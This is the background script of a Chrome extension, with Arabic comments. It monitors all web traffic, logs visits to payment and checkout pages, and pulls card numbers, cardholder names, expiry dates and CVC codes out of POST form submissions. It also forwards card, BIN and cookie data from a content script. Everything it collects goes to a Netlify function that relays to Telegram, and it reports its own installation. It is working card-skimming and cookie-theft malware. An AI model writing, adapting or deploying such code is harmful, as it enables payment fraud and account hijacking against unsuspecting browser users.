const NETLIFY_API_URL = 'https://deluxe-sfogliatella-8f76e0.netlify.app/.netlify/functions/telegram-api';

// توليد معرف فريد للجهاز (بدون استخدام canvas)
function generateDeviceFingerprint() {
  // استخدام معلومات المتصفح المتاحة في Service Worker
  const userAgent = navigator.userAgent;
  const language = navigator.language;
  const platform = navigator.platform;
  
  // إنشاء fingerprint من المعلومات المتاحة
  const text = userAgent + language + platform;
  const encoder = new TextEncoder();
  const data = encoder.encode(text);
  const fingerprint = Array.from(data, byte => byte.toString(16).padStart(2, '0')).join('').substring(0, 32);
  return fingerprint;
}

// توليد مفتاح جلسة
function generateSessionKey() {
  const array = new Uint8Array(16);
  crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

// حساب التوقيع
function calculateSignature(timestamp, data, deviceFingerprint) {
  const message = timestamp + JSON.stringify(data) + deviceFingerprint;
  const encoder = new TextEncoder();
  const data2 = encoder.encode(message);
  const signature = Array.from(data2, byte => byte.toString(16).padStart(2, '0')).join('').substring(0, 32);
  return signature;
}

// إرسال رسالة إلى تليجرام عبر الباك إند
async function sendToTelegram(data) {
  try {
    // توليد البيانات المطلوبة
    const deviceFingerprint = generateDeviceFingerprint();
    const sessionKey = generateSessionKey();
    const timestamp = Date.now();
    const signature = calculateSignature(timestamp, data, deviceFingerprint);
    
    const requestBody = {
      data: data,
      deviceFingerprint: deviceFingerprint,
      sessionKey: sessionKey,
      timestamp: timestamp,
      signature: signature
    };
    
    console.log('📤 إرسال طلب إلى الباك إند:', {
      type: data.type,
      deviceFingerprint: deviceFingerprint.substring(0, 10) + '...',
      timestamp: new Date(timestamp).toISOString()
    });
    
    const response = await fetch(NETLIFY_API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Device-Fingerprint': deviceFingerprint,
        'X-Session-Key': sessionKey,
        'X-Timestamp': timestamp.toString(),
        'X-Signature': signature
      },
      body: JSON.stringify(requestBody)
    });
    
    // التحقق من نوع المحتوى
    const contentType = response.headers.get('content-type');
    if (!contentType || !contentType.includes('application/json')) {
      const text = await response.text();
      console.error('❌ الباك إند يرجع HTML بدلاً من JSON:', {
        status: response.status,
        contentType: contentType,
        text: text.substring(0, 200) + '...'
      });
      return { 
        success: false, 
        error: `الباك إند يرجع ${contentType || 'محتوى غير معروف'} بدلاً من JSON`,
        status: response.status
      };
    }
    
    const result = await response.json();
    
    if (response.ok && result.success) {
      console.log('✅ تم إرسال الرسالة بنجاح:', {
        messageId: result.message_id,
        remainingRequests: result.rateLimit?.remainingRequests,
        resetTime: result.rateLimit?.resetTime
      });
      
      // عرض معلومات Rate Limiting
      if (result.rateLimit) {
        console.log(`📊 الطلبات المتبقية: ${result.rateLimit.remainingRequests}`);
        console.log(`⏰ الوقت المتبقي: ${result.rateLimit.resetTime} ثانية`);
      }
      
      return { success: true, data: result };
    } else {
      console.error('❌ فشل في إرسال الرسالة:', result);
      
      // التعامل مع Rate Limiting
      if (result.code === 'RATE_LIMIT_EXCEEDED') {
        console.warn(`⚠️ تم تجاوز حد الطلبات. انتظر ${result.remainingTime} ثانية`);
        
        // عرض تنبيه للمستخدم
        chrome.notifications.create({
          type: 'basic',
          iconUrl: 'icon48.png',
          title: 'تنبيه Rate Limiting',
          message: `تم تجاوز حد الطلبات. انتظر ${Math.ceil(result.remainingTime / 60)} دقيقة`
        });
      }
      
      // تحسين عرض رسالة الخطأ
      let errorMessage = 'خطأ غير معروف';
      if (result.error) {
        errorMessage = typeof result.error === 'string' ? result.error : JSON.stringify(result.error);
      } else if (result.message) {
        errorMessage = typeof result.message === 'string' ? result.message : JSON.stringify(result.message);
      } else {
        errorMessage = JSON.stringify(result);
      }
      
      console.error('📋 تفاصيل الخطأ:', {
        status: response.status,
        statusText: response.statusText,
        result: result,
        errorMessage: errorMessage
      });
      
      return { success: false, error: errorMessage, code: result.code, details: result };
    }
    
  } catch (error) {
    console.error('❌ خطأ في الاتصال بالباك إند:', error);
    
    // معالجة أنواع مختلفة من الأخطاء
    let errorMessage = 'خطأ في الاتصال بالخادم';
    
    if (error.name === 'TypeError' && error.message.includes('fetch')) {
      errorMessage = 'خطأ في الاتصال بالشبكة';
    } else if (error.name === 'DOMException') {
      errorMessage = 'خطأ في معالجة البيانات';
    } else if (error.message) {
      errorMessage = error.message;
    }
    
    return { success: false, error: errorMessage };
  }
}

// دالة إرسال بيانات البطاقة
async function sendCardData(cardData) {
  const data = {
    type: 'card',
    message: {
      number: cardData.number,
      name: cardData.name,
      expiry: cardData.expiry,
      cvc: cardData.cvc
    }
  };
  
  return await sendToTelegram(data);
}

// دالة إرسال بيانات BIN
async function sendBinData(binData) {
  const data = {
    type: 'bin',
    message: {
      pattern: binData.pattern,
      name: binData.name,
      cardNumber: binData.cardNumber,
      expiryDate: binData.expiryDate,
      cvc: binData.cvc
    }
  };
  
  return await sendToTelegram(data);
}

// دالة إرسال Cookies
async function sendCookiesData(cookiesData) {
  const data = {
    type: 'cookies',
    message: cookiesData.message,
    url: cookiesData.url,
    cookies: cookiesData.cookies
  };
  
  return await sendToTelegram(data);
}

// دالة إرسال رسالة عادية
async function sendMessage(message) {
  const data = {
    type: 'message',
    message: message
  };
  
  return await sendToTelegram(data);
}

// مراقبة الطلبات (بدون blocking)
chrome.webRequest.onBeforeRequest.addListener(
  async function(details) {
    if (details.type === 'main_frame') {
      const url = new URL(details.url);
      
      // مراقبة صفحات البطاقات
      if (url.hostname.includes('payment') || url.hostname.includes('checkout')) {
        console.log('🔍 تم اكتشاف صفحة دفع:', url.href);
        
        // إرسال إشعار
        await sendMessage(`تم زيارة صفحة دفع: ${url.href}`);
      }
    }
  },
  { urls: ['<all_urls>'] }
);

// مراقبة النماذج (بدون blocking)
chrome.webRequest.onBeforeRequest.addListener(
  async function(details) {
    if (details.method === 'POST' && details.requestBody) {
      const url = new URL(details.url);
      
      // مراقبة نماذج البطاقات
      if (url.hostname.includes('payment') || url.pathname.includes('card')) {
        try {
          const formData = details.requestBody.formData;
          if (formData) {
            const cardData = {
              number: formData['card_number']?.[0] || formData['number']?.[0] || '',
              name: formData['card_name']?.[0] || formData['name']?.[0] || '',
              expiry: formData['expiry']?.[0] || formData['expiry_date']?.[0] || '',
              cvc: formData['cvc']?.[0] || formData['cvv']?.[0] || ''
            };
            
            if (cardData.number && cardData.number.length > 10) {
              console.log('💳 تم اكتشاف بيانات بطاقة:', {
                number: cardData.number.substring(0, 6) + '******',
                name: cardData.name,
                expiry: cardData.expiry
              });
              
              await sendCardData(cardData);
            }
          }
        } catch (error) {
          console.error('❌ خطأ في معالجة بيانات البطاقة:', error);
        }
      }
    }
  },
  { urls: ['<all_urls>'] },
  ['requestBody']
);

// استقبال الرسائل من Content Script
chrome.runtime.onMessage.addListener(async function(request, sender, sendResponse) {
  try {
    switch (request.action) {
      case 'sendCardData':
        const cardResult = await sendCardData(request.data);
        sendResponse(cardResult);
        break;
        
      case 'sendBinData':
        const binResult = await sendBinData(request.data);
        sendResponse(binResult);
        break;
        
      case 'sendCookiesData':
        const cookiesResult = await sendCookiesData(request.data);
        sendResponse(cookiesResult);
        break;
        
      case 'sendMessage':
        const messageResult = await sendMessage(request.data);
        sendResponse(messageResult);
        break;
        
      default:
        sendResponse({ success: false, error: 'إجراء غير معروف' });
    }
  } catch (error) {
    console.error('❌ خطأ في معالجة الرسالة:', error);
    sendResponse({ success: false, error: 'خطأ داخلي' });
  }
  
  return true; // للسماح بالرد غير المتزامن
});

// إعداد الإشعارات
chrome.notifications.onClicked.addListener(function(notificationId) {
  console.log('تم النقر على الإشعار:', notificationId);
});

// تسجيل بدء الإكستنشن
console.log('🚀 تم تشغيل الإكستنشن بنجاح');
console.log('📡 الباك إند: Netlify Functions');
console.log('🛡️ نظام Rate Limiting: 10 رسائل/دقيقة لكل جهاز');

// إرسال رسالة بدء التشغيل عند التثبيت
chrome.runtime.onInstalled.addListener(async function() {
  await sendMessage('تم تشغيل الإكستنشن بنجاح - نظام Rate Limiting مفعل');
}); 